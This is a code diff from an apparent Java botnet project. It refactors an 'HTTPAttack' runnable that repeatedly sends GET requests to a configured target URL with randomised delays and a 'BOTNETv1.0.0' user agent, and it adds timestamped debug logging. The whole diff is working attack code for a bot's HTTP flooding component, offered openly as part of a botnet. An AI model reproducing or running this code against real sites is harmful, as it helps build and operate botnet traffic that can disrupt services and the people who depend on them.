@@ -26,13 +26,17 @@
 
 package com.acmutv.botnet.attacks;
 
+import com.acmutv.botnet.config.BotConfiguration;
 import com.acmutv.botnet.model.Target;
 import com.acmutv.botnet.tools.RandomTools;
 import lombok.Data;
 
 import java.io.IOException;
 import java.net.*;
+import java.time.LocalDateTime;
+import java.time.format.DateTimeFormatter;
 import java.util.Random;
+import java.util.concurrent.TimeUnit;
 
 /**
  * This class realizes the runnable performing the GET attack.
@@ -42,26 +46,24 @@ import java.util.Random;
  * @see Target
  */
 @Data
-public class HTTPAttacker implements Runnable {
+public class HTTPAttack implements Runnable {
   private final Target target;
-  private final boolean output;
   private Random rnd = new Random();
 
   @Override
   public void run() {
     Target tgt = this.getTarget();
-    long i = 0;
-    for (i = 0; i < tgt.getMaxAttempts(); i++) {
+    for (long i = 0; i < tgt.getMaxAttempts(); i++) {
       try {
         this.makeGetRequest(tgt.getUrl());
       } catch (IOException e) {
         e.printStackTrace();
         return;
       }
-      int millis = RandomTools.getRandomInt(tgt.getPeriod().getMin(), tgt.getPeriod().getMax(),
+      int seconds = RandomTools.getRandomInt(tgt.getPeriod().getMin(), tgt.getPeriod().getMax(),
           this.getRnd());
       try {
-        Thread.sleep(millis);
+        TimeUnit.SECONDS.sleep(seconds);
       } catch (InterruptedException e) {
         e.printStackTrace();
       }
@@ -73,8 +75,11 @@ public class HTTPAttacker implements Runnable {
     http.setRequestMethod("GET");
     http.setRequestProperty("User-Agent", "BOTNETv1.0.0");
     int response = http.getResponseCode();
-    if (this.isOutput()) {
-      System.out.format("[BOT]> GET %s :: %d\n", url, response);
+
+    boolean debug = BotConfiguration.getInstance().isDebug();
+    DateTimeFormatter dtf = BotConfiguration.getInstance().getDtf();
+    if (debug) {
+      System.out.format("[BOT %s]> GET %s :: %d\n", dtf.format(LocalDateTime.now()), url, response);
     }
   }
 
